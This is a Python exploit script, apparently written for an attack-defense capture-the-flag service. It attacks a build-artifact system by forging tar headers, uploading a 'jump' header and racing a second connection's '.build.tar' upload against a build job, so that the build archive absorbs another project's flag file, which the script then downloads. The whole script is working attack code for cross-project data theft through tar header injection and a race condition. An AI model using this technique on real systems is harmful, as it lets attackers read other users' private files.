#!/usr/bin/env python3

import gzip
import struct
import sys
import time
import uuid

from starlib import *


def gen_tar_header(name: str, size: int):
    file_name = name

    # Create a tar header
    header = bytearray(512)
    struct.pack_into("100s", header, 0, file_name.encode())
    struct.pack_into("8s", header, 124, str(oct(size))[2:].encode())
    header[156] = 0x30  # Type flag (regular file)
    header[257:265] = b"0" * 8  # UID
    header[265:273] = b"0" * 8  # GID
    header[273:281] = struct.pack("<8s", b"")  # File mode (empty for simplicity)
    header[329:337] = struct.pack(
        "<8s", b""
    )  # Modification time (empty for simplicity)
    header[148:156] = struct.pack("<8s", b"")  # Checksum field (initially empty)

    # Calculate and set the checksum
    header_checksum = (sum(header) + 0x20 * 8) & 0o7777
    struct.pack_into("6s", header, 148, str(oct(header_checksum)[2:]).encode())
    header[148 + 6] = 0x20  # Add a space to terminate the checksum

    return bytes(header)


def main(host: str, flag_id: str):
    project_id, filename = flag_id.split("/")
    name, fmt = filename.split(".")

    cm = CheckMachine(host)
    conn1 = cm.connect()
    conn2 = cm.connect()

#     attack_project_id = str(uuid.uuid4())
    attack_project_id = 'pwn'  # for easier debugging
    print('attack project id:', attack_project_id)
    attack_project_pass = cm.create_project(conn1, attack_project_id)
    cm.enter_project(conn2, attack_project_id, attack_project_pass)

    # # prepare padding file (just for clarity, can use flag/jump files instead).
    padding_header = gen_tar_header("padding_filename", 512)
    padding_content = b"a" * 512

    cm.solve_captcha(conn1)
    cm.upload(conn1, "padding.tar", padding_header + padding_content)
    print("padding response:", conn1.recv())

    # prepare "jump" tar header in file 1.
    # upload will fail, but the file will be created anyway.

    # consume next 2048 bytes, should be enough.
    jump_file_size = 2048
    jump_header = gen_tar_header("jump_filename", jump_file_size)

    cm.solve_captcha(conn1)
    cm.upload(conn1, "jump.tar", jump_header)
    print("jump header response:", conn1.recv(), ' / ', conn1.recv(), ' / ', conn1.recv())

    # We inject our file after 2000 random files
    # (each have tar header and tar content),
    # plus tar header for the jump file itself
    # minus tar header itself.
    jump_offset = 512 * 2 * 2000 + 512 - 512
    start_header = gen_tar_header("start_filename", jump_offset)

    artifacts = [
        Artifact(
            source="padding",
            destination=f"padding{i}",
        )
        for i in range(2000)
    ]
    artifacts += [
        Artifact(
            source="jump.tar",
            destination=f"jump",
        )
    ]
    artifacts += [
        Artifact(
            source_project=project_id,
            source=f"{name}.{fmt}",
            destination="target",
        )
    ]
    # Pad after to avoid out of bounds read.
    artifacts += [
        Artifact(
            source="padding",
            destination=f"padding{10000 + i}",
        )
        for i in range(5)
    ]
    job = Job(steps=[Step(name="build", artifacts=artifacts)])

    cm.solve_captcha(conn1)
    cm.solve_captcha(conn2)

    cm.job(conn1, JobRequest(job=job))
    time.sleep(0.5)
    cm.upload(conn2, ".build.tar", start_header)

    job_resp = conn1.recv()
    if "internal error" in job_resp:
        job_resp += " / " + conn1.recv()
    print('job:', job_resp)
    print('upload:', conn2.recv())

    print("list:", cm.list(conn1, "build/"))
    data = cm.download(conn1, "build/jump_filename")
    print("download:", data)
    if fmt == 'targz':
        print('decompressed:', gzip.decompress(data[512:1024]))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <host> <flag_id>")
        exit(1)

    main(sys.argv[1], sys.argv[2])
